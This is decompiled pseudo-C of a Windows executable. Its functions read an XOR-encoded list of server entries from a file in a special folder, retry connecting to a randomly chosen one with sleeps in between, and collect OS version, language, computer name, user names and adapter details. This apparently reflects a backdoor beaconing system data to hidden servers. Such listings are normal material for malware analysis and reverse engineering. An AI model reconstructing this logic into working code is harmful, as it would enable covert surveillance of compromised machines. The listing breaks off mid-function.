typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void * spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor * pType;
    ptrdiff_t dispCatchObj;
    void * addressOfHandler;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void * UniqueProcess;
    void * UniqueThread;
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (* action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType * pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry * pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry * pTryBlockMap;
    uint nIPMapEntries;
    void * pIPToStateMap;
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo * LPCPINFO;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

typedef ulong DWORD;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef ushort WORD;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _TIME_ZONE_INFORMATION _TIME_ZONE_INFORMATION, *P_TIME_ZONE_INFORMATION;

typedef struct _TIME_ZONE_INFORMATION * LPTIME_ZONE_INFORMATION;

typedef long LONG;

typedef wchar_t WCHAR;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _TIME_ZONE_INFORMATION {
    LONG Bias;
    WCHAR StandardName[32];
    SYSTEMTIME StandardDate;
    LONG StandardBias;
    WCHAR DaylightName[32];
    SYSTEMTIME DaylightDate;
    LONG DaylightBias;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR * LPWSTR;

typedef BYTE * LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW * LPSTARTUPINFOW;

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _WIN32_FIND_DATAW * LPWIN32_FIND_DATAW;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR * LPSTR;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (* PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SYSTEMTIME * LPSYSTEMTIME;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW * LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR * LPCSTR;

typedef LONG * PLONG;

typedef CHAR * LPCH;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef struct _OSVERSIONINFOA * LPOSVERSIONINFOA;

typedef WCHAR * PCNZWCH;

typedef WORD LANGID;

typedef WCHAR * LPWCH;

typedef WCHAR * LPCWSTR;

typedef DWORD LCID;

typedef CHAR * PCNZCH;

typedef HANDLE * PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef uint UINT_PTR;

typedef ULONG_PTR SIZE_T;

typedef int (* FARPROC)(void);

typedef DWORD * LPDWORD;

typedef WORD * LPWORD;

typedef int INT;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef BOOL * LPBOOL;

typedef void * LPCVOID;

typedef struct HINSTANCE__ * HINSTANCE;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ * HWND;

struct HWND__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef struct _SHFILEOPSTRUCTW _SHFILEOPSTRUCTW, *P_SHFILEOPSTRUCTW;

typedef struct _SHFILEOPSTRUCTW * LPSHFILEOPSTRUCTW;

typedef WORD FILEOP_FLAGS;

struct _SHFILEOPSTRUCTW {
    HWND hwnd;
    UINT wFunc;
    LPCWSTR pFrom;
    LPCWSTR pTo;
    FILEOP_FLAGS fFlags;
    BOOL fAnyOperationsAborted;
    LPVOID hNameMappings;
    LPCWSTR lpszProgressTitle;
};

typedef uint size_t;




undefined4 * __fastcall FUN_00401040(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  void *local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0040c168;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  FUN_00403840();
  local_4 = 0;
  FUN_00403470();
  *param_1 = &PTR_FUN_0040d1b8;
  param_1[0x89] = 0;
  puVar2 = (undefined4 *)((int)param_1 + 0x5aa);
  for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  FUN_004045bd((undefined4 *)((int)param_1 + 0x5aa),&DAT_0040f378);
  param_1[0x1ab] = 0;
  param_1[0x3ad] = 0;
  param_1[0x1ac] = 0;
  *(undefined2 *)(param_1 + 0x8a) = 0;
  puVar2 = param_1 + 0x43c;
  for (iVar1 = 0xd; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  ExceptionList = local_c;
  return param_1;
}



undefined4 __thiscall FUN_004010e0(undefined4 param_1_00,byte param_1)

{
  FUN_00401100();
  if ((param_1 & 1) != 0) {
    FUN_00403d80(param_1_00);
  }
  return param_1_00;
}



void __fastcall FUN_00401100(undefined4 *param_1)

{
  void *local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  puStack_8 = &LAB_0040c188;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  *param_1 = &PTR_FUN_0040d1b8;
  local_4 = 0;
  if (param_1[0x89] != 0) {
    WSACloseEvent(param_1[0x89]);
  }
  FUN_004034c0();
  local_4 = 0xffffffff;
  FUN_00403880();
  ExceptionList = local_c;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __thiscall FUN_00401170(int param_1_00,uint param_1)

{
  BOOL BVar1;
  HANDLE hFile;
  DWORD DVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  undefined4 *puVar6;
  WCHAR local_22c;
  undefined4 local_22a [129];
  undefined4 local_24;
  undefined4 local_20;
  undefined2 local_1c;
  undefined local_18 [4];
  undefined *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0040c1a0;
  local_10 = ExceptionList;
  local_14 = &stack0xfffffdc8;
  local_22c = DAT_00412294;
  puVar6 = local_22a;
  for (iVar5 = 0x81; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  local_24 = _DAT_0040f390;
  *(undefined2 *)puVar6 = 0;
  local_8 = 0;
  local_20 = DAT_0040f394;
  local_1c = DAT_0040f398;
  ExceptionList = &local_10;
  BVar1 = SHGetSpecialFolderPathW((HWND)0x0,&local_22c,0x35,1);
  if (BVar1 != 0) {
    FUN_00404593(&local_22c,&DAT_0040f388);
    FUN_00404593(&local_22c,u_humb_0040f37c);
    FUN_00404593(&local_22c,&local_24);
    hFile = CreateFileW(&local_22c,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if ((hFile != (HANDLE)0xffffffff) &&
       (DVar2 = GetFileSize(hFile,(LPDWORD)0x0), DVar2 / 0x48 != 0)) {
      if (param_1 != 0) {
        param_1 = 0x2d0;
        BVar1 = ReadFile(hFile,&DAT_0040f0a8,0x2d0,&param_1,(LPOVERLAPPED)0x0);
        if (BVar1 == 0) {
          ExceptionList = local_10;
          return 0;
        }
        *(uint *)(param_1_00 + 0xeb8) = param_1 / 0x48;
        if (param_1 / 0x48 == 0) {
          ExceptionList = local_10;
          return 0;
        }
        for (uVar3 = 0; uVar3 < param_1; uVar3 = uVar3 + 4) {
          *(uint *)((int)&DAT_0040f0a8 + uVar3) = *(uint *)((int)&DAT_0040f0a8 + uVar3) ^ 0x780046;
        }
      }
      CloseHandle(hFile);
      FUN_004046db(local_18);
      iVar5 = FUN_004045e2(local_18);
      *(int *)(param_1_00 + 0xeb4) = *(int *)(iVar5 + 0x18) % *(int *)(param_1_00 + 0xeb8);
      FUN_00401400();
      FUN_00403cb0();
      uVar4 = FUN_00402f50(0xf0,0xf0);
      *(undefined4 *)(param_1_00 + 0x10ec) = uVar4;
      uVar3 = extraout_ECX;
      while (iVar5 = FUN_00403890(&DAT_0040f0a8 + *(int *)(param_1_00 + 0xeb4) * 0x12,
                                  uVar3 & 0xffff0000 |
                                  (uint)*(ushort *)
                                         (&DAT_0040f0e8 + *(int *)(param_1_00 + 0xeb4) * 0x48)),
            iVar5 == 0) {
        DVar2 = WaitForSingleObject(*(HANDLE *)(param_1_00 + 0x224),
                                    *(int *)(param_1_00 + 0x10ec) * 1000);
        uVar3 = extraout_ECX_00;
        if (DVar2 != 0x102) {
          Sleep(1000);
          uVar3 = extraout_ECX_01;
        }
      }
      iVar5 = WSACreateEvent();
      *(int *)(param_1_00 + 0x224) = iVar5;
      if (iVar5 != 0) {
        while (iVar5 = FUN_00402890(), iVar5 == 0) {
          DVar2 = WaitForSingleObject(*(HANDLE *)(param_1_00 + 0x224),
                                      *(int *)(param_1_00 + 0x10ec) * 1000);
          if (DVar2 != 0x102) {
            Sleep(1000);
          }
        }
        ExceptionList = local_10;
        return 1;
      }
    }
  }
  ExceptionList = local_10;
  return 0;
}



undefined4 Catch_004013e3(void)

{
  return 0x4013e9;
}



undefined4
FUN_00401400(undefined param_1,undefined param_2,char param_3,undefined4 param_4,byte *param_5,
            undefined param_6,undefined *param_7,undefined4 param_8)

{
  LPOSVERSIONINFOW lpVersionInformation;
  byte *pbVar1;
  char cVar2;
  LANGID LVar3;
  BOOL BVar4;
  undefined4 uVar5;
  int iVar6;
  DWORD DVar7;
  int extraout_ECX;
  uint uVar8;
  uint uVar9;
  int iVar10;
  uint uVar11;
  LPWSTR pWVar12;
  undefined4 *puVar13;
  char *pcVar14;
  char *pcVar15;
  undefined4 *puVar16;
  undefined uStack00000005;
  undefined uStack00000006;
  undefined uStack00000007;
  undefined uStack00000009;
  undefined4 uStack0000000d;
  undefined2 uStack00000019;
  undefined uStack0000001b;
  undefined uStack0000002a;
  
  FUN_00404830();
  FUN_004032c0((undefined4 *)(extraout_ECX + 0x430),0x150,0);
  lpVersionInformation = (LPOSVERSIONINFOW)(extraout_ECX + 0x438);
  lpVersionInformation->dwOSVersionInfoSize = 0x11c;
  BVar4 = GetVersionExW(lpVersionInformation);
  *(BOOL *)(extraout_ECX + 0x434) = BVar4;
  lpVersionInformation->dwOSVersionInfoSize = 0x114;
  GetVersionExW(lpVersionInformation);
  LVar3 = GetSystemDefaultLangID();
  *(LANGID *)(extraout_ECX + 0x554) = LVar3;
  GetSystemDefaultLCID();
  GetUserDefaultUILanguage();
  uVar5 = FUN_00403050();
  *(undefined4 *)(extraout_ECX + 0x430) = uVar5;
  *(undefined2 *)(extraout_ECX + 0x54a) = 0;
  iVar6 = FUN_00404809(extraout_ECX + 0x44c);
  iVar6 = iVar6 + 1;
  if (0x1f < iVar6) {
    *(undefined2 *)(extraout_ECX + 0x48a) = 0;
    iVar6 = 0x20;
  }
  pWVar12 = (LPWSTR)(extraout_ECX + 0x44c + iVar6 * 2);
  BVar4 = GetComputerNameW(pWVar12,(LPDWORD)&stack0x00000000);
  if (BVar4 == 0) {
    FUN_004045bd(pWVar12,&DAT_0040f3a4);
  }
  iVar6 = FUN_00404809(pWVar12);
  pWVar12 = pWVar12 + iVar6 + 1;
  if (0 < ((extraout_ECX - (int)pWVar12) + 0x54c >> 1) + -1) {
    cVar2 = GetUserNameExW(0xc,pWVar12,&stack0x00000000);
    if (cVar2 == '\0') {
      FUN_004045bd(pWVar12,&DAT_0040f3a4);
    }
    iVar6 = FUN_00404809(pWVar12);
    pWVar12 = pWVar12 + iVar6 + 1;
  }
  if (0 < ((extraout_ECX - (int)pWVar12) + 0x54c >> 1) + -1) {
    cVar2 = GetUserNameExW(2,pWVar12,&stack0x00000000);
    if (cVar2 == '\0') {
      FUN_004045bd(pWVar12,&DAT_0040f3a4);
    }
  }
  param_4._2_1_ = 0x2a;
  param_5 = (byte *)0x0;
  param_6 = 0;
  uStack00000019 = 0;
  param_3 = '*';
  uStack0000001b = 0;
  param_4._1_1_ = 0x2e;
  uStack0000000d = 0x2a2e2a2e;
  param_7 = &param_1;
  param_4._3_1_ = 0;
  param_1 = 0;
  uStack00000005 = 0;
  uStack00000006 = 0;
  uStack00000007 = 0;
  param_2 = 0;
  uStack00000009 = 0;
  pcVar14 = &param_3;
  param_8 = 0x2800;
  iVar6 = GetAdaptersInfo(&stack0x00000044,&param_8);
  if (iVar6 == 0) {
    pcVar14 = &stack0x000001ec;
    param_5 = &stack0x000001d0;
  }
  pbVar1 = param_5;
  uVar8 = 0xffffffff;
  do {
    pcVar15 = pcVar14;
    if (uVar8 == 0) break;
    uVar8 = uVar8 - 1;
    pcVar15 = pcVar14 + 1;
    cVar2 = *pcVar14;
    pcVar14 = pcVar15;
  } while (cVar2 != '\0');
  uVar8 = ~uVar8;
  iVar6 = 7;
  puVar13 = (undefined4 *)(pcVar15 + -uVar8);
  puVar16 = (undefined4 *)(extraout_ECX + 0x56e);
  for (uVar9 = uVar8 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
    *puVar16 = *puVar13;
    puVar13 = puVar13 + 1;
    puVar16 = puVar16 + 1;
  }
  for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
    *(undefined *)puVar16 = *(undefined *)puVar13;
    puVar13 = (undefined4 *)((int)puVar13 + 1);
    puVar16 = (undefined4 *)((int)puVar16 + 1);
  }
  param_7 = (undefined *)((uint)param_7 & 0xffffff00 | (uint)DAT_00412290);
  puVar13 = (undefined4 *)((int)&param_7 + 1);
  for (iVar10 = 7; iVar10 != 0; iVar10 = iVar10 + -1) {
    *puVar13 = 0;
    puVar13 = puVar13 + 1;
  }
  *(undefined2 *)puVar13 = 0;
  *(undefined *)((int)puVar13 + 2) = 0;
  do {
    uVar8 = 0xffffffff;
    pcVar14 = &DAT_0040f39c;
    do {
      pcVar15 = pcVar14;
      if (uVar8 == 0) break;
      uVar8 = uVar8 - 1;
      pcVar15 = pcVar14 + 1;
      cVar2 = *pcVar14;
      pcVar14 = pcVar15;
    } while (cVar2 != '\0');
    uVar8 = ~uVar8;
    iVar10 = -1;
    puVar13 = &param_7;
    do {
      puVar16 = puVar13;
      if (iVar10 == 0) break;
      iVar10 = iVar10 + -1;
      puVar16 = (undefined4 *)((int)puVar13 + 1);
      cVar2 = *(char *)puVar13;
      puVar13 = puVar16;
    } while (cVar2 != '\0');
